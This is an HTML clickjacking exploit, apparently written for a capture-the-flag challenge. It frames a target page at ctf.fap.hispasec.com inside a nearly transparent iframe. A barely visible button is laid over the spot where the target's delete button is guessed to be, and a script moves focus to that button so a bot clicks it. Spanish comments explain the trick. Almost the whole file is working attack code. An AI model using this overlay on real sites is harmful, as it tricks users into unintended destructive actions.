<!DOCTYPE html>
<html>
<head>
    <style>
        body { margin: 0; padding: 0; background: white; }
        
        #victim-container {
            position: relative;
            width: 1000px;
            height: 1200px;
            margin: 0 auto;
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
            /* Opacidad muy baja pero NO cero */
            opacity: 0.05; 
        }

        #objetivo {
            position: absolute;
            z-index: 2;
            /* Posición más probable para el botón de borrar */
            top: 820px; 
            left: 50px;
            
            width: 200px;
            height: 60px;
            
            /* IMPORTANTE: Color casi invisible pero NO transparente */
            background-color: rgba(255, 0, 0, 0.01);
            border: 1px solid rgba(0, 0, 0, 0.01);
            cursor: pointer;
            outline: none;
        }
    </style>
</head>
<body>
    <div id="victim-container">
        <button id="objetivo" type="button"></button>
        
        <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
    </div>

    <script>
        // TRUCO EXTRA: Forzar el foco en el botón para que el bot lo vea rápido
        window.onload = function() {
            document.getElementById('objetivo').focus();
        };
    </script>
</body>
</html>
